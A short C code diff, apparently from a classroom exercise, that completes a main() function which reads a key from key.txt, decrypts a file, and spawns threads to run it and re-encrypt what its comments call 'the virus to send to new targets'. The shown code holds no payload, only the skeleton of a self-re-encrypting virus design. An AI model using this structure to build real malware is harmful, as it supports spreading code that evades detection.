@@ -11,6 +11,7 @@
 int main(int argc, char*argv[]) {
 	int ret;
 	int key; // Encryption key
+	FILE *fp;
 
 	/* Initialize Space for 2 Threads */
 	threads = (pthread_t *)malloc(sizeof(pthread_t)*2);
@@ -18,7 +19,13 @@ int main(int argc, char*argv[]) {
 	/* 
 		Decrypt the file XtoM.c using the key in key.txt
 	*/
-	// TODO
+	// Get the key from key.txt
+	fp = fopen("key.txt","r");
+	fscanf (fp, "%d", &key); 
+	fclose(fp);
+
+	// Decrypt the file
+	decryptFile(key);
 
 	/*
 		Create new threads to run XtoM and re-encrypt the virus to send to new targets
@@ -31,7 +38,7 @@ int main(int argc, char*argv[]) {
 
 	/* Encrypt File */
 	// Generate a new key and put it in the file key.txt
-	key = 8; // TODO randomize
+	key = 0; // TODO randomize
 
 	// Encrypt the file XtoMCopy.c using the key
 	pthread_create(&threads[1], &attribute, encryptFile, &key); /* create a new thread */
